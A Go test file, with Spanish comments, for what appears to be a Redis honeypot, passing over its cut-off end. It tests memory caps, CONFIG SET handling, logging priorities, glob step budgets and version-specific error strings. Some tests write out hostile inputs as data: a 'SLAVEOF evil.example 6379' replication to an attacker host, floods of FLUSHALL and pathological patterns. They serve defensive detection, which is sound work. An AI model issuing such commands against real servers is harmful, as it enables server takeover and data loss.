package main

// Pruebas de los hallazgos de la segunda revisión (hallazgos2-redis.json).
// Cada una lleva en el nombre lo que demuestra. Las de topes van por TCP de
// loopback contra el atender real, sin contenedores.

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

// ---- Utilidades -------------------------------------------------------------

// servidorTCP arranca servir en 127.0.0.1 con un puerto libre. parar cancela
// (como SIGTERM) y espera a que servir termine.
func servidorTCP(t *testing.T, c conf) (*servidor, string, func()) {
	t.Helper()
	s := servidorPrueba(t, c)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancelar := context.WithCancel(context.Background())
	hecho := make(chan struct{})
	go func() {
		s.servir(ctx, ln)
		close(hecho)
	}()
	var una sync.Once
	parar := func() { una.Do(func() { cancelar(); <-hecho }) }
	t.Cleanup(parar)
	return s, ln.Addr().String(), parar
}

func orden(args ...string) []byte {
	var b strings.Builder
	fmt.Fprintf(&b, "*%d\r\n", len(args))
	for _, a := range args {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
	}
	return []byte(b.String())
}

// esperarEvento espera a que el registro tenga un evento que cumpla f.
func esperarEvento(t *testing.T, ruta string, f func(map[string]any) bool) map[string]any {
	t.Helper()
	limite := time.Now().Add(3 * time.Second)
	for time.Now().Before(limite) {
		for _, m := range lineas(t, ruta) {
			if f(m) {
				return m
			}
		}
		time.Sleep(20 * time.Millisecond)
	}
	return nil
}

func heapVivo() uint64 {
	runtime.GC()
	runtime.GC()
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.HeapAlloc
}

// ---- Hallazgo 0: la cola de MULTI y las órdenes tienen tope ------------------

// Antes: MULTI y 1.100 'SET k <60 KB>' sin EXEC dejaban 69 MB vivos desde una
// sola conexión. Ahora la conexión se corta al pasar el tope de su cola, la
// memoria no crece y queda un redis.session.tope.
func TestColaMultiTopadaPorConexionYSinCrecerElHeap(t *testing.T) {
	s, dir, _ := servidorTCP(t, conf{})
	antes := heapVivo()

	conn, err := net.Dial("tcp", dir)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	r := bufio.NewReader(conn)
	conn.Write(orden("MULTI"))
	if l, _ := r.ReadString('\n'); l != "+OK\r\n" {
		t.Fatalf("MULTI debería dar +OK, dio %q", l)
	}
	set := orden("SET", "k", strings.Repeat("v", 60<<10))
	go func() {
		for i := 0; i < 2000; i++ {
			if _, err := conn.Write(set); err != nil {
				return // la trampa ya cortó
			}
		}
	}()
	encoladas := 0
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	for {
		l, err := r.ReadString('\n')
		if err != nil {
			break
		}
		if l == "+QUEUED\r\n" {
			encoladas++
		}
	}
	if encoladas == 0 || encoladas > 2 {
		t.Fatalf("con órdenes de 60 KB la cola debería cortar enseguida: %d encoladas", encoladas)
	}
	if m := esperarEvento(t, s.cfg.registro, func(m map[string]any) bool {
		return m["eventid"] == "redis.session.tope"
	}); m == nil || !strings.Contains(fmt.Sprint(m["motivo"]), "MULTI") {
		t.Fatalf("el corte debería dejar un redis.session.tope con su motivo: %v", m)
	}
	if despues := heapVivo(); despues > antes+8<<20 {
		t.Fatalf("el heap vivo creció %d MB por una sola conexión", (despues-antes)>>20)
	}
}

// Inline con miles de argumentos de un byte: cada orden cuenta sus cabeceras
// (16 bytes por argumento), así que la cola corta tras unas pocas, y una
// línea de más de maxArgs argumentos es un error de protocolo, como en RESP.
func TestColaMultiCuentaLasCabecerasDeLosArgumentosInline(t *testing.T) {
	s, dir, _ := servidorTCP(t, conf{})
	conn, err := net.Dial("tcp", dir)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	r := bufio.NewReader(conn)
	conn.Write([]byte("MULTI\r\n"))
	r.ReadString('\n')
	linea := []byte("DEL" + strings.Repeat(" a", 1000) + "\r\n")
	go func() {
		for i := 0; i < 200; i++ {
			if _, err := conn.Write(linea); err != nil {
				return
			}
		}
	}()
	encoladas := 0
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	for {
		l, err := r.ReadString('\n')
		if err != nil {
			break
		}
		if l == "+QUEUED\r\n" {
			encoladas++
		}
	}
	// Cada orden cuenta unos 17 KB: caben 3 o 4 en la cola de ~68 KB.
	if encoladas < 1 || encoladas > 4 {
		t.Fatalf("la cola debería cortar tras 3 o 4 órdenes de 1.000 argumentos, encoló %d", encoladas)
	}
	if esperarEvento(t, s.cfg.registro, func(m map[string]any) bool { return m["eventid"] == "redis.session.tope" }) == nil {
		t.Fatalf("falta el redis.session.tope")
	}

	if _, err := leer("DEL"+strings.Repeat(" a", maxArgs+1)+"\r\n", 65536, true); err != errInline {
		t.Fatalf("una línea inline de más de %d argumentos debería ser error de protocolo, dio %v", maxArgs, err)
	}
	if args, err := leer("DEL"+strings.Repeat(" a", maxArgs-1)+"\r\n", 65536, true); err != nil || len(args) != maxArgs {
		t.Fatalf("una línea de %d argumentos debería valer: %d, %v", maxArgs, len(args), err)
	}
}

// El presupuesto de memoria de clientes tiene tope por IP y total, la
// franquicia de cada orden no gasta de él, y la cola de una conexión que no
// cabe en lo que le queda a su IP se corta aunque no llegue a su tope propio.
func TestPresupuestoMemoriaClientesPorIPYTotal(t *testing.T) {
	p := nuevoPresupuesto(1<<20, 256<<10)
	a1, a2 := p.cuotaPara("198.51.100.1"), p.cuotaPara("198.51.100.1")
	b := p.cuotaPara("203.0.113.1")
	if !a1.tomarOrden(franquiciaOrden) {
		t.Fatal("la franquicia no debería gastar del presupuesto")
	}
	if total, _ := p.usado(); total != 0 {
		t.Fatalf("la franquicia gastó %d bytes del presupuesto", total)
	}
	if !a1.tomarCola(200<<10) || a2.tomarCola(100<<10) {
		t.Fatal("una IP no debería pasar de su parte (256 KB) entre todas sus conexiones")
	}
	if !b.tomarCola(200 << 10) {
		t.Fatal("otra IP debería tener su propia parte")
	}
	for i := 0; i < 3; i++ {
		p.cuotaPara(fmt.Sprintf("192.0.2.%d", i)).tomarCola(250 << 10)
	}
	if p.cuotaPara("192.0.2.200").tomarCola(200 << 10) {
		t.Fatal("entre todas las IP no se debería pasar del total")
	}
	a1.soltarTodo()
	if !a2.tomarCola(100 << 10) {
		t.Fatal("al soltar, la IP recupera su parte")
	}

	// Una orden de 60 KB no cabe en un presupuesto de 16 KB por IP.
	chico := nuevoPresupuesto(16<<10, 16<<10)
	entrada := string(orden("SET", "k", strings.Repeat("v", 60<<10)))
	if _, err := leerComando(bufio.NewReader(strings.NewReader(entrada)), 65536, true, chico.cuotaPara("198.51.100.9")); err != errMemoria {
		t.Fatalf("una orden más grande que lo que le queda a su IP debería dar errMemoria, dio %v", err)
	}

	// La cola de MULTI pasa por el presupuesto aunque quepa en el tope propio.
	s := servidorPrueba(t, conf{})
	cli := clientePrueba(s, "198.51.100.10")
	cli.cuota = nuevoPresupuesto(32<<10, 32<<10).cuotaPara(cli.ip)
	ejecutar(s, cli, "MULTI")
	if out, cerrar := ejecutar(s, cli, "SET", "k", strings.Repeat("v", 40<<10)); !cerrar || out != "" || cli.corte == "" {
		t.Fatalf("sin sitio en el presupuesto, la conexión se corta sin contestar: %q %v %q", out, cerrar, cli.corte)
	}
}

// ---- Hallazgo 1: CONFIG SET con lista cerrada y sin mapa sin tope -----------

func TestConfigSetListaCerradaConLosErroresDeCadaVersion(t *testing.T) {
	casos := []struct {
		version string
		args    []string
		quiere  string
	}{
		{"7.2.4", []string{"CONFIG", "SET", "maxmemory-zzz-no-existe", "x"}, "-ERR Unknown option or number of arguments for CONFIG SET - 'maxmemory-zzz-no-existe'\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "list-zzz", "x"}, "-ERR Unknown option or number of arguments for CONFIG SET - 'list-zzz'\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "client-foo", "x"}, "-ERR Unknown option or number of arguments for CONFIG SET - 'client-foo'\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "rename-command", "x"}, "-ERR Unknown option or number of arguments for CONFIG SET - 'rename-command'\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "daemonize", "yes"}, "-ERR CONFIG SET failed (possibly related to argument 'daemonize') - can't set immutable config\r\n"},
		{"7.0.15", []string{"CONFIG", "SET", "logfile", "/tmp/x"}, "-ERR CONFIG SET failed (possibly related to argument 'logfile') - can't set immutable config\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "maxmemory", "1", "maxmemory", "2"}, "-ERR CONFIG SET failed (possibly related to argument 'maxmemory') - duplicate parameter\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "maxmemory", "1", "foo"}, "-ERR syntax error\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "maxmemory"}, "-ERR wrong number of arguments for 'config|set' command\r\n"},
		{"7.2.4", []string{"CONFIG", "SET", "maxmemory", "100mb"}, "+OK\r\n"},
		{"7.0.15", []string{"CONFIG", "SET", "set-max-listpack-entries", "1"}, "-ERR Unknown option or number of arguments for CONFIG SET - 'set-max-listpack-entries'\r\n"},
		{"6.2.14", []string{"CONFIG", "SET", "list-zzz", "x"}, "-ERR Unsupported CONFIG parameter: list-zzz\r\n"},
		{"6.2.14", []string{"CONFIG", "SET", "daemonize", "yes"}, "-ERR Unsupported CONFIG parameter: daemonize\r\n"},
		{"6.2.14", []string{"CONFIG", "SET", "bind", "0.0.0.0"}, "-ERR Unsupported CONFIG parameter: bind\r\n"},
		{"6.2.14", []string{"CONFIG", "set", "maxmemory", "0", "dir", "/x"}, "-ERR Unknown subcommand or wrong number of arguments for 'set'. Try CONFIG HELP.\r\n"},
		{"6.2.14", []string{"CONFIG", "SET", "slave-read-only", "no"}, "+OK\r\n"},
	}
	for _, c := range casos {
		s := servidorPrueba(t, conf{version: c.version})
		cli := clientePrueba(s, "198.51.100.1")
		if out, _ := ejecutar(s, cli, c.args...); out != c.quiere {
			t.Errorf("%s %v:\n dio    %q\n quiere %q", c.version, c.args, out, c.quiere)
		}
	}
	// El alias y el nombre propio son el mismo parámetro.
	s := servidorPrueba(t, conf{version: "7.2.4"})
	cli := clientePrueba(s, "198.51.100.1")
	ejecutar(s, cli, "CONFIG", "SET", "slave-read-only", "no")
	if out, _ := ejecutar(s, cli, "CONFIG", "GET", "replica-read-only"); !strings.Contains(out, "\r\nno\r\n") {
		t.Fatalf("CONFIG GET replica-read-only debería ver lo puesto con su alias: %q", out)
	}
}

// Antes: 1.100 'CONFIG SET list-N <60 KB>' dejaban 69 MB vivos en la vista
// de una IP. Ahora los nombres inventados no se guardan, los valores se
// recortan y lo guardado cuenta en el tope de bytes de la IP y del banco.
func TestConfigSetNoHaceCrecerLaVista(t *testing.T) {
	s := servidorPrueba(t, conf{version: "7.2.4"})
	cli := clientePrueba(s, "198.51.100.1")
	valor := strings.Repeat("v", 60<<10)
	antes := heapVivo()
	for i := 0; i < 1100; i++ {
		ejecutar(s, cli, "CONFIG", "SET", fmt.Sprintf("list-%d", i), valor)
	}
	// Todos los parámetros que se pueden cambiar, con valores de 60 KB.
	for k, c := range s.id.parametros {
		if c == parModificable {
			ejecutar(s, cli, "CONFIG", "SET", k, valor)
		}
	}
	var n, bytesConfig, bytesBanco int
	s.banco.conVista(func() {
		n = len(cli.vista.config)
		for _, v := range cli.vista.config {
			if len(v) > maxValorConfig {
				t.Errorf("valor de CONFIG sin recortar: %d bytes", len(v))
			}
		}
		bytesConfig, bytesBanco = cli.vista.configB, s.banco.bytes
	})
	if n > len(s.id.parametros) {
		t.Fatalf("la vista guarda %d parámetros, más que los que existen (%d)", n, len(s.id.parametros))
	}
	if bytesConfig > s.banco.maxBytesIP || bytesBanco > s.banco.maxBytes {
		t.Fatalf("lo guardado de CONFIG (%d) no cuenta en los topes (%d por IP, %d total)", bytesConfig, s.banco.maxBytesIP, s.banco.maxBytes)
	}
	if despues := heapVivo(); despues > antes+4<<20 {
		t.Fatalf("CONFIG SET hizo crecer el heap vivo %d MB", (despues-antes)>>20)
	}
	// Al quitar la vista, su CONFIG deja de contar.
	s.banco.conVista(func() { s.banco.quitarVista(cli.vista) })
	if s.banco.bytes != 0 {
		t.Fatalf("al quitar la vista el banco debería quedar a cero, tiene %d", s.banco.bytes)
	}
}

// SETNAME, SETINFO, HELLO SETNAME y el host de SLAVEOF se guardan recortados.
func TestNombresYHostDeReplicaRecortados(t *testing.T) {
	s := servidorPrueba(t, conf{version: "7.2.4"})
	cli := clientePrueba(s, "198.51.100.1")
	largo := strings.Repeat("a", 64<<10)
	if out, _ := ejecutar(s, cli, "CLIENT", "SETNAME", largo); out != "+OK\r\n" || len(cli.nombre) != maxNombreCliente {
		t.Fatalf("CLIENT SETNAME debería recortar a %d: %q, %d", maxNombreCliente, out, len(cli.nombre))
	}
	if out, _ := ejecutar(s, cli, "CLIENT", "SETNAME", "con espacio"); !strings.HasPrefix(out, "-ERR Client names cannot contain spaces") {
		t.Fatalf("un nombre con espacios debería dar error: %q", out)
	}
	ejecutar(s, cli, "CLIENT", "SETINFO", "LIB-NAME", largo)
	ejecutar(s, cli, "CLIENT", "SETINFO", "LIB-VER", largo)
	if len(cli.biblioteca) != maxNombreCliente || len(cli.libVer) != maxNombreCliente {
		t.Fatalf("CLIENT SETINFO debería recortar: %d, %d", len(cli.biblioteca), len(cli.libVer))
	}
	ejecutar(s, cli, "HELLO", "3", "SETNAME", largo+"b")
	if len(cli.nombre) != maxNombreCliente {
		t.Fatalf("HELLO SETNAME debería recortar: %d", len(cli.nombre))
	}
	if out, _ := ejecutar(s, cli, "SLAVEOF", largo, "6379"); out != "+OK\r\n" {
		t.Fatalf("SLAVEOF debería dar +OK: %q", out)
	}
	s.banco.conVista(func() {
		if len(cli.vista.replica[0]) > maxHostReplica {
			t.Errorf("el host de SLAVEOF no se recortó: %d bytes", len(cli.vista.replica[0]))
		}
	})
	if out, _ := ejecutar(s, cli, "SLAVEOF", "evil.example", "no-es-un-puerto"); out != "-"+errNoEntero+"\r\n" {
		t.Fatalf("SLAVEOF con un puerto no numérico debería dar el error de entero: %q", out)
	}
}

// ---- Hallazgo 2: AUTH no gasta el sitio de lo grave -------------------------

// La prueba del revisor: a las 10:00 y a las 11:00, 16 IP mandan ráfagas de
// AUTH y 10 s después llega un SLAVEOF de otra IP. Antes se registraban 0 de
// 2; ahora los dos, y los AUTH callados se cuentan aparte de lo grave.
func TestAuthDeDieciseisIPNoOcultaElSlaveofDeOtra(t *testing.T) {
	ruta := filepath.Join(t.TempDir(), "redis.json")
	rel := &reloj{t: time.Date(2026, 10, 16, 10, 0, 0, 0, time.UTC)}
	reg, err := nuevoRegistrador(ruta, 67108864, 5*time.Minute, rel.ahora)
	if err != nil {
		t.Fatal(err)
	}
	clave := strings.Repeat("p", 500)
	for _, hora := range []int{10, 11} {
		rel.t = time.Date(2026, 10, 16, hora, 0, 0, 0, time.UTC)
		for ip := 0; ip < 16; ip++ {
			for i := 0; i < 6000; i++ {
				reg.escribir(evento{EventID: "redis.auth", Comando: "AUTH", Password: clave, SrcIP: fmt.Sprintf("198.51.100.%d", ip+1)})
			}
		}
		rel.t = rel.t.Add(10 * time.Second)
		reg.escribir(evento{EventID: "redis.command.grave", Comando: "SLAVEOF", Args: "evil.example 6379",
			Grave: "réplica", SrcIP: "203.0.113.5"})
		rel.t = rel.t.Add(6 * time.Minute)
		reg.tic()
	}
	reg.cerrar()

	slaveof, authCallados := 0, false
	for _, m := range lineas(t, ruta) {
		if m["eventid"] == "redis.command.grave" && m["src_ip"] == "203.0.113.5" && strings.Contains(fmt.Sprint(m["args"]), "evil.example") {
			slaveof++
		}
		if m["eventid"] == "redis.log.omitidos" && m["omitidos_auth"] != nil {
			authCallados = true
			if m["omitidos_graves"] != nil {
				t.Errorf("los AUTH callados no deberían contar como graves: %v", m)
			}
		}
	}
	if slaveof != 2 {
		t.Fatalf("deberían registrarse los 2 SLAVEOF de la víctima, hay %d", slaveof)
	}
	if !authCallados {
		t.Fatalf("los AUTH callados deberían salir en redis.log.omitidos (omitidos_auth)")
	}
}

// Aunque muchas IP agoten la bolsa de lo grave de la hora (FLUSHALL es gratis
// en modo abierto), el SLAVEOF de otra IP queda en versión compacta, con su
// destino, y el resumen pone por delante a las IP con lo grave omitido.
func TestGraveDeOtraIPQuedaEnVersionCompacta(t *testing.T) {
	ruta := filepath.Join(t.TempDir(), "redis.json")
	rel := &reloj{t: time.Date(2026, 10, 16, 10, 0, 0, 0, time.UTC)}
	reg, err := nuevoRegistrador(ruta, 67108864, 5*time.Minute, rel.ahora)
	if err != nil {
		t.Fatal(err)
	}
	for ip := 0; ip < 100; ip++ {
		for i := 0; i < 3000; i++ {
			reg.escribir(evento{EventID: "redis.command.grave", Comando: "FLUSHALL", Grave: "borrado de la base (FLUSHALL/FLUSHDB)",
				Session: "0123456789abcdef", SrcIP: fmt.Sprintf("198.51.%d.%d", ip/200, ip%200+1)})
		}
	}
	if reg.gastado[bolsaGrave] < reg.permitido(bolsaGrave, rel.t) {
		t.Fatalf("la prueba tiene que agotar la bolsa de lo grave")
	}
	reg.escribir(evento{EventID: "redis.command.grave", Comando: "SLAVEOF", Args: "evil.example 6379",
		Grave: "réplica hacia servidor del atacante (SLAVEOF/REPLICAOF)", SrcIP: "203.0.113.5"})
	rel.t = rel.t.Add(6 * time.Minute)
	reg.tic()
	reg.cerrar()

	compacta, resumenGraves := false, false
	for _, m := range lineas(t, ruta) {
		if m["eventid"] == "redis.command.grave" && m["src_ip"] == "203.0.113.5" {
			compacta = m["aviso"] == avisoCompacta && strings.Contains(fmt.Sprint(m["args"]), "evil.example")
		}
		if m["eventid"] == "redis.log.omitidos" && m["src_ip"] != nil && m["omitidos_graves"] != nil {
			resumenGraves = true
		}
	}
	if !compacta {
		t.Fatalf("el SLAVEOF de la víctima debería quedar en versión compacta con su destino")
	}
	if !resumenGraves {
		t.Fatalf("el resumen debería nombrar a las IP con lo grave omitido")
	}
}

// ---- Hallazgo 3: KEYS/SCAN con patrón patológico ----------------------------

func TestKeysConPatronPatologicoGastaSuPresupuestoYEsCorrecto(t *testing.T) {
	s := servidorPrueba(t, conf{})
	cli := clientePrueba(s, "198.51.100.1")
	valor := strings.Repeat("a", 60<<10)
	for i := 0; i < 17; i++ {
		ejecutar(s, cli, "SET", fmt.Sprintf("%02d", i)+valor, "x")
	}
	// Sin medir tiempos (corre al construir la imagen, con las CPU que haya):
	// lo que acota la CPU es el presupuesto de pasos de la orden, y eso se
	// comprueba contando. Con el de producción, los patrones patológicos
	// acaban y no encajan con nada. Caben en maxPatron (256 bytes): de uno más
	// largo solo se mira el principio, y ya no sería el mismo patrón.
	for _, patron := range []string{
		strings.Repeat("*", 255) + "Z",      // se juntan los '*'
		strings.Repeat("*a", 127) + "Z",     // vuelta atrás en cada '*': lo para el presupuesto
		strings.Repeat("?", 200) + "*[^a]Z", // clases e interrogaciones
	} {
		if out, _ := ejecutar(s, cli, "KEYS", patron); out != "*0\r\n" {
			t.Fatalf("KEYS con un patrón patológico no debería encajar: %.40q", out)
		}
		if out, _ := ejecutar(s, cli, "SCAN", "0", "MATCH", patron); out != "*2\r\n$1\r\n0\r\n*0\r\n" {
			t.Fatalf("SCAN con un patrón patológico no debería encajar: %.40q", out)
		}
	}
	// Al acabarse el presupuesto, KEYS no encaja nada más: con el de
	// producción, '*a...a*' encaja con las 17 claves (nombres de 60 KB de
	// 'a'); con 1.000 pasos, se acaba en la primera y ninguna encaja.
	if ks := s.banco.claves(cli.vista, 0, strings.Repeat("*a", 127)+"*"); len(ks) != 17 {
		t.Fatalf("con el presupuesto de producción deberían encajar las 17 claves: %d", len(ks))
	}
	s.banco.maxTrabajo = 1000
	if ks := s.banco.claves(cli.vista, 0, strings.Repeat("*a", 127)+"*"); len(ks) != 0 {
		t.Fatalf("con el presupuesto agotado no debería encajar ninguna clave: %d", len(ks))
	}
	s.banco.maxTrabajo = maxTrabajoGlob
	// Y el glob sigue siendo el de Redis.
	casos := []struct {
		patron, s string
		quiere    bool
	}{
		{"*", "", true}, {"a**b", "ab", true}, {"a*b*c", "axxbyyc", true}, {"a*b*c", "axxbyy", false},
		{"*Z", valor, false}, {"[a-c]?\\*", "bx*", true}, {"h[^e]llo", "hallo", true}, {"", "", true}, {"", "a", false},
	}
	for _, c := range casos {
		if globRedis(c.patron, c.s) != c.quiere {
			t.Errorf("globRedis(%.20q, %.20q) debería ser %v", c.patron, c.s, c.quiere)
		}
	}
	trabajo := 10
	if compilarGlob("*a*a*a*b").encaja(strings.Repeat("a", 1000), &trabajo) || trabajo != 0 {
		t.Fatalf("al acabarse el presupuesto, no encaja")
	}
}

// El patrón se aplica fuera del candado del banco: mientras un KEYS está
// entre copiar los nombres y aplicar el patrón, el candado está libre y otra
// IP entra, lee y sale. Antes se medía cuánto esperaba la otra IP con cuatro
// KEYS en bucle, y eso medía el planificador, no el candado: con 2 CPU (az acr
// build) fallaba casi siempre. Ahora el KEYS se para ahí con un gancho y se
// mira el candado, sin tiempos.
func TestKeysNoRetieneElCandadoDelBanco(t *testing.T) {
	s := servidorPrueba(t, conf{})
	cli := clientePrueba(s, "198.51.100.1")
	for i := 0; i < 16; i++ {
		ejecutar(s, cli, "SET", fmt.Sprintf("k%02d", i), "x")
	}
	dentro, seguir := make(chan struct{}), make(chan struct{})
	s.banco.trasCopiarClaves = func() {
		close(dentro)
		<-seguir
	}
	hecho := make(chan []string, 1)
	go func() { hecho <- s.banco.claves(cli.vista, 0, "k*") }()
	<-dentro
	libre := s.banco.mu.TryLock()
	if libre {
		s.banco.mu.Unlock()
	}
	otra := make(chan struct{})
	if libre {
		go func() {
			otro := &cliente{}
			v := s.banco.entrar("203.0.113.9", otro)
			s.banco.get(v, 0, "x")
			s.banco.salir(v, otro)
			close(otra)
		}()
		select {
		case <-otra:
		case <-time.After(30 * time.Second): // solo para no colgarse: con el candado libre acaba enseguida
			libre = false
		}
	}
	close(seguir)
	ks := <-hecho
	s.banco.trasCopiarClaves = nil
	if !libre {
		t.Fatal("KEYS aplica el patrón con el candado del banco cogido: las demás IP esperan")
	}
	if len(ks) != 16 {
		t.Fatalf("KEYS k* debería dar las 16 claves: %d", len(ks))
	}
}

// CONFIG GET con mil patrones patológicos gasta un solo presupuesto: se
// comprueba contando, no con el reloj. Con 100.000 pasos, los mil patrones lo
// agotan y el 'maxmemory' del final ya no se mira; con un presupuesto por
// patrón, sí saldría.
func TestConfigGetConMilPatronesGastaUnSoloPresupuesto(t *testing.T) {
	s := servidorPrueba(t, conf{version: "7.2.4"})
	cli := clientePrueba(s, "198.51.100.1")
	args := []string{"CONFIG", "GET"}
	for i := 0; i < 1000; i++ {
		args = append(args, strings.Repeat("*a", 128))
	}
	args = append(args, "maxmemory")
	if out, _ := ejecutar(s, cli, "CONFIG", "GET", "maxmemory"); !strings.Contains(out, "maxmemory") {
		t.Fatalf("CONFIG GET maxmemory: %q", out)
	}
	s.banco.maxTrabajo = 100_000
	if out, _ := ejecutar(s, cli, args...); out != "*0\r\n" {
		t.Fatalf("con el presupuesto agotado por los mil patrones no debería salir nada: %.60q", out)
	}
	// Con el de producción, la orden acaba y responde.
	s.banco.maxTrabajo = maxTrabajoGlob
	if out, _ := ejecutar(s, cli, args...); !strings.HasPrefix(out, "*") {
		t.Fatalf("CONFIG GET con mil patrones: %.60q", out)
	}
}

// ---- Hallazgo 4: modo abierto, el usuario default es nopass -----------------

func TestModoAbiertoAceptaCualquierContrasenaDelUsuarioDefault(t *testing.T) {
	s := servidorPrueba(t, conf{version: "7.2.4"})
	cli := clientePrueba(s, "198.51.100.1")
	out, _ := ejecutar(s, cli, "HELLO", "3", "AUTH", "default", "loquesea")
	if !strings.HasPrefix(out, "%7\r\n") || cli.proto != 3 {
		t.Fatalf("HELLO 3 AUTH default x en modo abierto debería dar el mapa en RESP3: %q", out)
	}
	if out, _ := ejecutar(s, cli, "AUTH", "default", "loquesea"); out != "+OK\r\n" {
		t.Fatalf("AUTH default x en modo abierto debería dar +OK: %q", out)
	}
	if out, _ := ejecutar(s, cli, "AUTH", "Default", "x"); out != "-"+errWrongpass+"\r\n" {
		t.Fatalf("los usuarios distinguen mayúsculas: AUTH Default x debería dar WRONGPASS: %q", out)
	}
	if out, _ := ejecutar(s, cli, "AUTH", "otro", "x"); out != "-"+errWrongpass+"\r\n" {
		t.Fatalf("AUTH otro x debería dar WRONGPASS: %q", out)
	}
	if out, _ := ejecutar(s, cli, "AUTH", "x"); out != "-ERR AUTH <password> called without any password configured for the default user. Are you sure your configuration is correct?\r\n" {
		t.Fatalf("AUTH x en modo abierto debería dar el texto de 6.0 en adelante: %q", out)
	}
	cli2 := clientePrueba(s, "198.51.100.2")
	if out, _ := ejecutar(s, cli2, "HELLO", "2", "AUTH", "otro", "x"); !strings.HasPrefix(out, "-WRONGPASS") {
		t.Fatalf("HELLO AUTH con otro usuario debería dar WRONGPASS: %q", out)
	}
	// Como helloCommand: la versión va siempre primero.
	if out, _ := ejecutar(s, cli2, "HELLO", "AUTH", "default", "x"); out != "-ERR Protocol version is not an integer or out of range\r\n" {
		t.Fatalf("HELLO sin versión delante: %q", out)
	}
	if out, _ := ejecutar(s, cli2, "HELLO", "3", "FOO"); out != "-ERR Syntax error in HELLO option 'FOO'\r\n" {
		t.Fatalf("HELLO con opción desconocida: %q", out)
	}
	// La contraseña sigue registrándose.
	var ev evento
	marcarAuth(&ev, "HELLO", []string{"HELLO", "3", "AUTH", "default", "loquesea"})
	if ev.EventID != "redis.auth" || ev.Password != "loquesea" {
		t.Fatalf("HELLO AUTH debería seguir registrando la contraseña: %+v", ev)
	}
	// Con contraseña, nada cambia: solo la buena autentica.
	sp := servidorPrueba(t, conf{version: "7.2.4", contrasena: "Prueba-2026"})
	cp := clientePrueba(sp, "198.51.100.3")
	if out, _ := ejecutar(sp, cp, "AUTH", "default", "mala"); !strings.HasPrefix(out, "-WRONGPASS") || cp.autenticado {
		t.Fatalf("con contraseña, AUTH default mala debería dar WRONGPASS: %q", out)
	}
	if out, _ := ejecutar(sp, cp, "AUTH", "Prueba-2026"); out != "+OK\r\n" {
		t.Fatalf("con contraseña, AUTH buena debería dar +OK: %q", out)
	}
}

// ---- Hallazgo 5: el build id no es común a la flota -------------------------

func TestBuildIDDistintoEnCadaTrampaTambienEnDocker(t *testing.T) {
	for _, v := range []string{"7.2.4", "7.0.15", "6.2.14"} {
		c := conf{version: v}.conMinimos()
		cuenta := map[string]int{}
		docker := 0
		for i := 0; i < 600; i++ {
			id := nuevaIdentidad(c, fmt.Sprintf("semilla-%s-%d", v, i), time.Now())
			if id.perfil == "docker" {
				docker++
			}
			cuenta[id.buildID]++
			if cuenta[id.buildID] > 2 {
				t.Fatalf("%s: el build id %s se repite en %d trampas (perfil %s)", v, id.buildID, cuenta[id.buildID], id.perfil)
			}
		}
		if docker < 100 {
			t.Fatalf("%s: la prueba necesita trampas con perfil docker, salieron %d", v, docker)
		}
	}
	// Estable para la misma semilla (no cambia entre reinicios).
	c := conf{version: "7.2.4"}.conMinimos()
	if nuevaIdentidad(c, "fija", time.Now()).buildID != nuevaIdentidad(c, "fija", time.Now()).buildID {
		t.Fatal("el build id de una trampa no debería cambiar entre reinicios")
	}
}

// ---- Hallazgo 6: el formato exacto de los errores ---------------------------

func TestUnknownCommandFormato(t *testing.T) {
	largo := []string{"FOO", strings.Repeat("A", 100), strings.Repeat("B", 100), "c"}
	casos := []struct {
		version string
		args    []string
		quiere  string
	}{
		{"7.2.4", []string{"FOO", "a", "b"}, "-ERR unknown command 'FOO', with args beginning with: 'a' 'b' \r\n"},
		{"7.0.15", []string{"foo", "a", "b"}, "-ERR unknown command 'foo', with args beginning with: 'a' 'b' \r\n"},
		{"6.2.14", []string{"FOO", "a", "b"}, "-ERR unknown command `FOO`, with args beginning with: `a`, `b`, \r\n"},
		{"7.2.4", []string{"FOO"}, "-ERR unknown command 'FOO', with args beginning with: \r\n"},
		{"7.2.4", largo, "-ERR unknown command 'FOO', with args beginning with: '" + strings.Repeat("A", 100) + "' '" + strings.Repeat("B", 25) + "' \r\n"},
		// En 6.2 el primero ocupa 104 bytes (acento, 100, acento, coma y espacio): quedan 24.
		{"6.2.14", largo, "-ERR unknown command `FOO`, with args beginning with: `" + strings.Repeat("A", 100) + "`, `" + strings.Repeat("B", 24) + "`, \r\n"},
		{"7.2.4", []string{"FOO", "a\r\nb"}, "-ERR unknown command 'FOO', with args beginning with: 'a  b' \r\n"},
		{"7.2.4", []string{strings.Repeat("Z", 300)}, "-ERR unknown command '" + strings.Repeat("Z", 128) + "', with args beginning with: \r\n"},
		// Los comandos de 7.0 no existen en 6.2.
		{"6.2.14", []string{"FUNCTION", "LIST"}, "-ERR unknown command `FUNCTION`, with args beginning with: `LIST`, \r\n"},
		// Subcomandos de los contenedores.
		{"7.2.4", []string{"CONFIG", "FOO"}, "-ERR unknown subcommand 'FOO'. Try CONFIG HELP.\r\n"},
		{"7.2.4", []string{"config", "GET"}, "-ERR wrong number of arguments for 'config|get' command\r\n"},
		{"7.2.4", []string{"CONFIG"}, "-ERR wrong number of arguments for 'config' command\r\n"},
		{"6.2.14", []string{"CONFIG", "foo"}, "-ERR Unknown subcommand or wrong number of arguments for 'foo'. Try CONFIG HELP.\r\n"},
		{"6.2.14", []string{"CONFIG", "GET"}, "-ERR Unknown subcommand or wrong number of arguments for 'GET'. Try CONFIG HELP.\r\n"},
		{"6.2.14", []string{"CONFIG", "GET", "a", "b"}, "-ERR Unknown subcommand or wrong number of arguments for 'GET'. Try CONFIG HELP.\r\n"},
